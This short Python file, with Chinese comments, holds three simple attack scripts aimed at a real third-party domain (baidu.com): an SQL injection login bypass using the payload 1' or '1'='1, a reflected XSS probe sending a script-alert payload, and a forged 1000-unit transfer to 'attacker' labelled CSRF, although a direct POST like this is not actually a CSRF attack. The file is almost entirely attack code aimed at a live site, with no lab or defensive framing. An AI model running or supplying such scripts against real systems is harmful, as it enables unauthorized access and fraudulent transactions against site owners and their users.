# SQL注入
import requests

url = "http://baidu.com"
payload = {"username": "admin", "password": "1' or '1'='1"}
response = requests.post(url, data=payload)

if "登录成功" in response.text:
    print("登录成功")
else:
    print("登录失败")

# XSS
import requests
from bs4 import BeautifulSoup

url = "http://baidu.com"
payload = "<script>alert('XSS')</script>"
response = requests.get(url, params={"q": payload})

soup = BeautifulSoup(response.text, "html.parser")
if payload in soup.text:
    print("可能存在XSS漏洞")
else:
    print("未发现漏洞")

# CSRF
import requests

url = "http://baidu.com"
payload = {"amount": 1000, "to": "attacker"}
response = requests.post(url, data=payload)

if "转账成功" in response.text:
    print("CSRF攻击成功")
else:
    print("攻击失败")
